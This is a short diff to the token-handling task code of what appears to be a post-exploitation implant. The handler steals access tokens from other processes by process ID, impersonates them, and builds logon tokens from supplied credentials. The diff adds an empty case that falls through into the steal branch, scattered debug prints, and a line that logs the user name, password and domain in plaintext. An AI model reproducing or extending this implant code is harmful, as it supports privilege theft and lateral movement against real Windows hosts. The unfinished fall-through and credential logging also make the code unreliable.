@@ -1101,6 +1101,9 @@ auto DECLFN Task::Token(
 
             break;
         }
+        case Enm::Token::Store: {
+
+        }
         case Enm::Token::Steal: {
             ULONG ProcessID = Self->Psr->Int32( Parser );
             BOOL  TokenUse  = Self->Psr->Int32( Parser );
@@ -1109,11 +1112,17 @@ auto DECLFN Task::Token(
             KhDbg("id: %d use: %s", ProcessID, TokenUse ? "true" : "false");
             TOKEN_NODE* Token = Self->Tkn->Steal( ProcessID );
 
+            KhDbg("dbg");
+
             if ( ! Token ) {
                 Self->Pkg->Int32( Package, FALSE ); break;
             }
 
+            KhDbg("dbg");
+
             if ( TokenUse ) Self->Tkn->Use( Token->Handle );
+
+            KhDbg("dbg");
 
             Self->Pkg->Int32( Package, TRUE );
 
@@ -1146,9 +1155,11 @@ auto DECLFN Task::Token(
         }
         case Enm::Token::Make: {
             CHAR*  UserName    = Self->Psr->Str( Parser, 0 );
-            CHAR*  DomainName  = Self->Psr->Str( Parser, 0 );
             CHAR*  Password    = Self->Psr->Str( Parser, 0 );
+            CHAR*  DomainName  = Self->Psr->Str( Parser, 0 );
             HANDLE TokenHandle = nullptr;
+
+            KhDbg("%s %s %s\n", UserName, Password, DomainName);
 
             BOOL Success = FALSE;
 
